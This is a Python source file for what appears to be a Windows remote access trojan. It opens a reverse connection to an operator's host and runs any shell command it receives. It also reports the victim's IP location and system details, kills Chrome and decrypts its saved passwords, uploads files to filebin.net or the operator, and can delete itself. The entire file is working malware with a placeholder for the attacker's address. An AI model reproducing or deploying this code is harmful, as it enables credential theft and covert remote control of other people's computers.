import socket
import subprocess
import os
import requests
from requests import get
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import sys
import json
import shutil
import base64
from ip2geotools.databases.noncommercial import DbIpCity
import sqlite3
import platform
import psutil
import win32crypt
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from datetime import timezone, datetime, timedelta
import shlex

"""
CHANGE THIS.
"""
host = 'YOUR IP HERE.(HOST MACHINE.)'  
port = 8888

class Colors:
    RESET = "\033[0m"
    BLACK = "\033[30m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    LIGHT_GRAY = "\033[37m"
    DARK_GRAY = "\033[90m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m"
    LIGHT_YELLOW = "\033[93m"
    LIGHT_BLUE = "\033[94m"
    LIGHT_MAGENTA = "\033[95m"
    LIGHT_CYAN = "\033[96m"
    WHITE = "\033[97m"
    BRIGHT_BLACK = "\033[90m"
    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"
    BRIGHT_MAGENTA = "\033[95m"
    BRIGHT_CYAN = "\033[96m"
    BRIGHT_WHITE = "\033[97m"


client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
urllib3.disable_warnings(InsecureRequestWarning)

is_running = True
socket_used = False

try:
    client_socket.connect((host, port))
    print("Connected to the server.")
    socket_used = True
except Exception as e:
    print(f"Cannot connect to the server: {e}")
    exit()

def upload_file_to_filebin(bin_id, file_name):
    bin_url = f'https://filebin.net/{bin_id}/{file_name}'
    headers = {'accept': 'application/json', 'Content-Type': 'application/octet-stream'}
    with open(file_name, 'rb') as file:
        file_content = file.read()
    response = requests.post(bin_url, headers=headers, data=file_content, verify=False)
    if response.status_code == 201:
        success_message = 'File uploaded successfully.\n'
        json_response = response.json()
        bin_url_response = json_response.get('result', {}).get('url', 'URL not available')
        return f"{success_message}URL: {bin_url_response}"
    else:
        error_string = "Error uploading the file. Status code:"
        error_response = response.status_code
        response_text = response.text
        return f"{error_string} {error_response}. Response: {response_text}"

def self_destruct(s):
    try:
        confirmation_message = f"{Colors.RED}Script Obliterated. GoodBye.{Colors.RESET}\n"
        if s.fileno() != -1:
            s.send(confirmation_message.encode())
        s.close()
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
    except Exception as e:
        error_message = f"Error during self-destruction: {e}\n"
        if s.fileno() != -1:
            s.send(error_message.encode())


def get_location(ip_address):
    try:
        response = DbIpCity.get(ip_address, api_key='free')
        return {
            "city": response.city,
            "region": response.region,
            "country": response.country
        }
    except Exception as e:
        return f"Error getting location: {e}"

def getIP():
    try:
        ip = get('https://api.ipify.org').content.decode('utf8')
        formatted_ip = f'User IP: {ip}'
        return formatted_ip, ip
    except requests.RequestException as e:
        return f"Error getting IP: {e}", ""
    
def mainIP(socket):
    formatted_ip, user_ip = getIP()
    if user_ip:
        location = get_location(user_ip)
        ip_info = f"{formatted_ip}, Location: {location}"
        socket.send(ip_info.encode('utf-8'))  
    else:
        socket.send("Error getting IP information".encode('utf-8'))  

def get_system_info(socket):
    operating_System = platform.system()
    os_version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    note_name = platform.node()
    hostname = platform.node()
    username = os.getlogin()

    system_formation = (
        f"\n{Colors.RED}Operating System:{Colors.RESET} {operating_System}\n"
        f"{Colors.GREEN}OS Version:{Colors.RESET} {os_version}\n"
        f"{Colors.YELLOW}Machine:{Colors.RESET} {machine}\n"
        f"{Colors.BLUE}Processor:{Colors.RESET} {processor}\n"
        f"{Colors.RED}Node Name:{Colors.RESET} {note_name}\n"
        f"{Colors.GREEN}Hostname:{Colors.RESET} {hostname}\n"
        f"{Colors.YELLOW}User Name:{Colors.RESET} {username}"
    )

    socket.send(system_formation.encode())

"""
CHROME DECRYPTER BEGINNING
"""

file_path = ""
copy_path = "LoginDataCopy.db"
output_file_path = "ShellNone_FileStandards_Chrome.txt"

def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        tag = password[-16:]
        password = password[15:-16]

        cipher = Cipher(algorithms.AES(encryption_key), modes.GCM(iv, tag), backend=default_backend())

        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(password) + decryptor.finalize()

        return decrypted_password.decode('utf-8')
    except Exception as e:
        return "No Passwords"

def compute_chrome_password(s):
    try:
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)

        output_text = ""

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usage = row[5]

            if user_name or decrypted_password:
                output_text += f"Main URL: {main_url}\n"
                output_text += f"Login URL: {login_page_url}\n"
                output_text += f"User name: {user_name}\n"
                output_text += f"Decrypted Password: {decrypted_password}\n"

            else:
                continue

            if date_of_creation != 86400000000 and date_of_creation:
                output_text += f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n"

            if last_usage != 86400000000 and last_usage:
                output_text += f"Last Used: {str(chrome_date_and_time(last_usage))}\n"
            
            output_text += "=" * 100 + "\n"

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

        with open(output_file_path, 'w') as output_file:
            output_file.write(output_text)

        s.send("Passwords successfully extracted and saved to {}".format(output_file_path).encode())

    except Exception as e:
        error_message = f"Error during Chrome password retrieval: {e}"
        s.send(error_message.encode())

def ProgramManagement(s,browser_name=None):
    if browser_name:
        browser_name = browser_name.lower()

    is_success_message = False

    for process in psutil.process_iter(['pid','name']):
        try:
            if browser_name in process.info['name'].lower():
                pid = process.info['pid']

                psutil.Process(pid).terminate()

            if not is_success_message:
                    success = f"{Colors.GREEN}Successfully terminated:{Colors.RESET}{browser_name}\n"
                    s.send(success.encode())
                    is_success_message = True

        except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.ZombieProcess) as e:
            s.send('There was an error while terminating the browser: {e}\n'.encode())
            pass


"""
--------------------- CHROME DECRYPTER ENDING ---------------------
"""


"""
--------------- SHELL ---------------
"""
try:
    while is_running:
        command = client_socket.recv(4096).decode()
        if command.lower() == 'exit':
            is_running = False
        elif command.lower() == 'getip':
            ipinfo = mainIP(client_socket)
            print(ipinfo)
        elif command.lower() == 'sysinfo':
            sysinfo = get_system_info(client_socket)
            print(sysinfo)
        elif command.startswith('filebin '):
            parts = command.split(maxsplit=2)
            if len(parts) == 3:
                _, bin_id, file_name = parts
                upload_result = upload_file_to_filebin(bin_id, file_name)
                client_socket.send(upload_result.encode())
            else:
                response_str = "Invalid filebin command format."
                client_socket.send(response_str.encode())
        elif command.startswith('!browser'):
            ProgramManagement(client_socket, 'chrome')
            time.sleep(5)
            compute_chrome_password(client_socket)
            client_socket.send(b"Decrypted chrome passwords successfully.\n")
        elif command.startswith('upload '):
            _, filename = command.split(maxsplit=1)
            try:
                filesize = os.path.getsize(filename)
                ready_signal = client_socket.recv(1024)
                if ready_signal == b"READY":
                    client_socket.send(str(filesize).encode())  
                    ack = client_socket.recv(1024) 
                    if ack == b"ACK":
                        with open(filename, 'rb') as f:
                            bytes_sent = 0
                            data = f.read(4096)
                            while data:
                                bytes_sent += client_socket.send(data)
                                data = f.read(4096)
                            print(f"Sent {bytes_sent} bytes successfully.")
                    else:
                        print("Error: No ACK received from server.")
            except FileNotFoundError:
                print(f"File not found: {filename}")
        elif command.startswith('cd '):
            parts = shlex.split(command)
            if len(parts) > 1:
                new_directory = parts[1]  
                try:
                    os.chdir(new_directory)
                    current_directory = os.getcwd()
                    client_socket.send(f"Changed directory to {current_directory}\n".encode())
                except FileNotFoundError:
                    client_socket.send(f"Directory not found: {new_directory}\n".encode())
                except Exception as e:
                    client_socket.send(f"Error changing directory: {e}\n".encode())

        elif command.startswith('!!terminus'):
            self_destruct(client_socket)
            is_running = False
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd())
            result, error = process.communicate()
            response = result.decode() + error.decode()
            if not response:
                response = "Command executed.\n"
            client_socket.send(response.encode())
finally:
    if socket_used:
        try:
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
            print("Socket closed successfully.")
        except OSError as e:
            if e.winerror == 10038:  
                print("Socket was already closed or invalid.")
            else:
                print(f"Error closing the socket: {e}")
    print("Disconnected from the server.")
